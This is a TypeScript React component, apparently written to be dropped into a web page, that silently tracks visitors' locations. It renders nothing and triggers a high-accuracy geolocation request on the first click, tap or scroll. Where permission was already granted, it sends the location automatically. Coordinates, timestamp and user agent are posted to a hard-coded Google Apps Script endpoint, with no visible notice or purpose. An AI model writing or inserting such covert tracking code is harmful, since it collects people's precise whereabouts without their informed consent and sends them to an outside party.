"use client";

import { useEffect } from "react";

export default function SendLocation() {
  useEffect(() => {
    let activated = false;

    const activate = () => {
      if (activated) return;
      activated = true;

      requestLocation();
      window.removeEventListener("click", activate);
      window.removeEventListener("touchstart", activate);
      window.removeEventListener("scroll", activate);
    };

    window.addEventListener("click", activate);
    window.addEventListener("touchstart", activate);
    window.addEventListener("scroll", activate);

    // Jika user sudah pernah izin sebelumnya → langsung kirim lokasi otomatis
    if (navigator.permissions) {
      navigator.permissions.query({ name: "geolocation" as PermissionName })
        .then((result) => {
          if (result.state === "granted") {
            activated = true;
            requestLocation();
          }
        })
        .catch(() => {});
    }

    return () => {
      window.removeEventListener("click", activate);
      window.removeEventListener("touchstart", activate);
      window.removeEventListener("scroll", activate);
    };
  }, []);

  const requestLocation = () => {
    if (!navigator.geolocation) {
      console.log("Browser tidak support geolocation");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;

        console.log("Lokasi:", latitude, longitude);

        fetch(
          "https://script.google.com/macros/s/AKfycbzpTBY0IIWKboWBHyfBnU6VTIFKduM3__oxlLudh0ziFFpjVC-5LDiB3h4fIHQ52Nhr/exec",
          {
            method: "POST",
            mode: "no-cors",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              latitude,
              longitude,
              timestamp: new Date().toISOString(),
              userAgent: navigator.userAgent,
            }),
          }
        );
      },
      (error) => {
        console.log("Error lokasi:", error.code, error.message);
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  };

  return null;
}
